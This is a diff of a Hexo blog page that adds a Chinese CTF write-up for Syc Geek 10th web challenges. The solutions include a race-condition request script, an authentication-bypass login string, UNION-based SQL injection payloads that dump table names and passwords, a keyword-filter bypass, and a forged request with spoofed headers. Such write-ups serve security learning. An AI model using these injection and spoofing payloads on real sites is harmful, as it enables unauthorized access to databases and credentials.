@@ -65,7 +65,7 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1572099090928.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1572100049777.png">
-<meta property="og:updated_time" content="2019-10-28T04:50:59.141Z">
+<meta property="og:updated_time" content="2019-10-28T10:34:58.643Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1572099090928.png">
   <link rel="canonical" href="https://li1m.github.io/2019/10/26/Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
@@ -294,7 +294,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-10-28 12:50:59" itemprop="dateModified" datetime="2019-10-28T12:50:59+08:00">2019-10-28</time>
+                <time title="Modified: 2019-10-28 18:34:58" itemprop="dateModified" datetime="2019-10-28T18:34:58+08:00">2019-10-28</time>
               </span>
             
           
@@ -316,7 +316,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>342</span>
+              <span>2.3k</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -326,7 +326,7 @@
               
                 <span class="post-meta-item-text">Reading time &asymp;</span>
               
-              <span>1 mins.</span>
+              <span>2 mins.</span>
             </span>
           
 
@@ -354,6 +354,28 @@
 <p>3.BurpSuiiiiiit!!! </p>
 <p>下载文件，解压一下是个jar文件，是burpsuite的扩展包，用burpsuite导入一下就能得到flag</p>
 <p>4.性感潇文清，在线算卦 </p>
+<p>打开题目发现源码中有信息，请求在0.1秒内容会变化，所以使用条件竞争，附一个简单脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geturl</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        r=rq.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Syc'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">data=[<span class="string">'http://148.70.59.198:42534/?u=1&amp;p=1'</span>,<span class="string">'http://148.70.59.198:42534/uploads/b336602455740930585c9e82995cc63b9fa7db8c/356a192b7913b04c54574d18c28d46e6395428ab'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    tasks = [gevent.spawn(geturl, url) <span class="keyword">for</span> url <span class="keyword">in</span> data]</span><br><span class="line">    gevent.joinall(tasks)</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以使用burpsuite一直发包请求，然后访问之后提示的页面</p>
+<p>5.Easysql</p>
+<p>万能密码登录输入用户名’=’ ，密码’=’</p>
+<p>6.Lovelysql </p>
+<p>简单的注入，这里用联合注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username=1' order by 3<span class="comment">-- -&amp;password=1	//查字段</span></span><br><span class="line">?username=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">-- -&amp;password=1	//查表名</span></span><br><span class="line">?username=<span class="number">1</span><span class="string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="l0ve1ysq1"-- -&amp;password=1	//查列名</span></span><br><span class="line"><span class="string">?username=1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>),<span class="number">3</span> <span class="keyword">from</span> l0ve1ysq1<span class="comment">-- -&amp;password=1	//查数据</span></span><br></pre></td></tr></table></figure>
+
+<p>7.Babysql </p>
+<p>测试一下发现关键字被过滤为空，可以双写绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1' ununionion selselectect 1,group_concat(passwoorrd),3 frofromm b4bsql<span class="comment">-- -&amp;password=1	//查数据</span></span><br></pre></td></tr></table></figure>
+
+<p>8.李三的代码审计笔记第一页 </p>
+<p>代码内容大概就是$password构成了一个数组，GET一个参数url，若没有url里面没有http://则退出，有则请求这个url，返回数据与$password构成的数组比较，相同则下一步，不同退出，按照要求写一个php代码，放在服务器，保存1.php，新建1.txt，内容为0，传参?url=xxx.xxx.xxx.xxx/1.php即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password=<span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">$arr=explode(<span class="string">" "</span>,$password);</span><br><span class="line">$c = intval(file_get_contents(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> $arr[$c];</span><br><span class="line"></span><br><span class="line">$c++;</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line"></span><br><span class="line">fwrite($file, $c);</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>9.神秘的三叶草 </p>
+<p>看了下源码，发现最后氛围两个字有超链接，打开Secret.php，根据要求发送如下请求</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">118.25</span><span class="number">.14</span><span class="number">.40</span>:<span class="number">8108</span></span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">referer: https://www.Sycsecret.com</span></span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -497,14 +519,14 @@
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
     
-    <span title="Symbols count total">4k</span>
+    <span title="Symbols count total">6k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
     
-    <span title="Reading time total">3 mins.</span>
+    <span title="Reading time total">5 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
   </div>
